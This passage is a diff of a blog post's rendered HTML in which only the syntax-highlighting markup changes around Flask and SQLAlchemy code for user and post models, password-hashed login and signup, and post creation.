+    &lt;span class=&quot;n&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;primary_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__repr__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;uuid &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__repr__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;uuid %r&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;login code&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;or_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_password_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;or_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_password_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
         &lt;span class=&quot;c1&quot;&gt;#do stuff
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;signup code&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;password_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_password_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;users_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'users'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autoload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;password_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_password_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;users_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autoload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;or_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;h1&amp;gt; duplicate username :(&amp;lt;/h1&amp;gt;&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;or_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;h1&amp;gt; duplicate username :(&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;del&gt;create signin/signup functionality&lt;/del&gt; DONE&lt;/p&gt;
@@ -318,23 +865,23 @@ then I just had to serve static files and add templates and endpoints&lt;/p&gt;
 &lt;p&gt;adding posts was easy&lt;/p&gt;
 
 &lt;p&gt;db model&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;__tablename__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;posts&quot;&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;__tablename__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;posts&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
 
-    &lt;span class=&quot;n&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;primary_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;author&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;primary_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;author&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__repr__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;uuid &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__repr__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;uuid %r&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;backend code&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts_table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
